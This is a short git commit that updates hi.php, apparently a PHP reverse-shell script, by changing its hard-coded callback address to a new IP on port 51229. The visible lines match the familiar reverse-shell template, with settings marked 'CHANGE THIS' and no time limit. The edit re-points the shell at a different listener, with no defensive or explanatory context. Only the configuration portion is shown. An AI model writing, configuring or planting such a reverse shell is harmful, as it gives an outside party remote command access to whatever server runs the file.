eedfea9cb8054e0225f3150cc32b457761c287dd
Raphael <rstoutebbs@gmail.com>
2024-12-30 22:29:55 -0600

    Update hi.php

--- hi.php
+++ hi.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '146.70.45.84';  // CHANGE THIS
+$ip = '45.239.66.219';  // CHANGE THIS
 $port = 51229;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
